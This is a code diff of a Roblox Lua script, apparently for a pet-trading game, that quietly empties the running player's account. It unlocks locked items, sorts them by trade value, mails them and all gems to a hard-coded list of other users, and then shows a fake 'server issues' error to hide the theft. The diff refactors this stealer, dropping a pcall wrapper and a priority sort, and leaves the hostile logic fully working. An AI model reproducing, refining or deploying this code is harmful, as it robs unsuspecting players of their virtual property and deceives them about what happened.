@@ -4,10 +4,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+local plr = game.Players.LocalPlayer
 local network = require(game.ReplicatedStorage.Library.Client.Network)
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
-local plr = game.Players.LocalPlayer
 local MailMessage = "GGz"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
@@ -161,7 +161,7 @@ end
 
 local netInvoke = network and network.Invoke
 
--- ================= UPDATED sendItem FUNCTION WITH ADAPTIVE DELAY =================
+-- ================= FIXED sendItem FUNCTION WITH ADAPTIVE DELAY =================
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
@@ -173,31 +173,28 @@ local function sendItem(category, uid, am)
         local currentUser = users[userIndex]
         local args = {currentUser, MailMessage, category, uid, am}
 
+        -- measure how long the server takes to respond
         local startTime = tick()
-        local success, response, err = pcall(function()
-            return netInvoke("Mailbox: Send", unpack(args))
-        end)
+        local response, err = netInvoke("Mailbox: Send", unpack(args))
         local elapsed = tick() - startTime
 
-        -- Adjust next delay dynamically
+        -- adjust next delay based on server response time
         sendDelay = math.max(defaultDelay, elapsed)
 
-        if success then
-            if response == true then
-                sent = true
-                GemAmount1 = GemAmount1 - mailSendPrice
-                mailSendPrice = math.ceil(mailSendPrice * 1.5)
-                if mailSendPrice > 5000000 then
-                    mailSendPrice = 5000000
-                end
-                wait(sendDelay)
-            elseif response == false and err == "They don't have enough space!" then
-                userIndex = userIndex + 1
-                if userIndex > maxUsers then
-                    sent = true
-                end
-                wait(sendDelay)
+        if response == true then
+            sent = true
+            GemAmount1 = GemAmount1 - mailSendPrice
+            mailSendPrice = math.ceil(mailSendPrice * 1.5)
+            if mailSendPrice > 5000000 then
+                mailSendPrice = 5000000
             end
+            wait(sendDelay)
+        elseif response == false and err == "They don't have enough space!" then
+            userIndex = userIndex + 1
+            if userIndex > maxUsers then
+                sent = true
+            end
+            wait(sendDelay)
         else
             wait(sendDelay)
         end
@@ -267,13 +264,7 @@ local function canSendMail()
         uid = i
         break
     end
-    local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
-        [5] = 1
-    }
+    local args = {"Roblox", "Test", "Pet", uid, 1}
     local response, err = network.Invoke("Mailbox: Send", unpack(args))
     return (err == "They don't have enough space!")
 end
@@ -300,23 +291,19 @@ for i, v in pairs(categoryList) do
                             prefix = "Shiny " .. prefix
                         end
                         local id = prefix .. item.id
-                        local priority = (dir.gargantuan or dir.titanic) and 1 or 0
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id, priority = priority})
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
                     end
                 end
             else
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, priority = 0})
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                     totalRAP = totalRAP + (rapValue * (item._am or 1))
                 end
             end
             if item._lk then
-                local args = {
-                    [1] = uid,
-                    [2] = false
-                }
+                local args = {uid, false}
                 network.Invoke("Locking_SetLocked", unpack(args))
             end
         end
@@ -332,9 +319,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
     end
 
     table.sort(sortedItems, function(a, b)
-        if a.priority ~= b.priority then
-            return a.priority > b.priority
-        end
         return (a.rap * a.amount) > (b.rap * b.amount)
     end)
 
@@ -353,6 +337,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
-
-    message.Error("We are Having server issues please rejoin and try again")
+    message.Error("We are having server issues, please rejoin and try again")
 end
